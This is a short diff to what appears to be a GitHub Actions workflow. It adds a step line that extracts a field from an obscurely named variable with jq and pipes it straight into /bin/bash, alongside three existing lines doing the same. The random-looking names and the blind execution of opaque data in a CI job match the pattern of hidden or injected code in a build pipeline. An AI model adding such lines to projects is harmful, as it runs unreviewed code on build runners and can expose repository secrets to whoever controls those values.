@@ -25,6 +25,7 @@ jobs:
           echo $mohoh96 | jq -r .xl80 | /bin/bash
           printf '%s' "$b48" | jq -r .w87 | /bin/bash
           echo $zoox1584 | jq -r .fybhs402 | /bin/bash
+          printf '%s' "$fyo9010" | jq -r .vpxh885 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
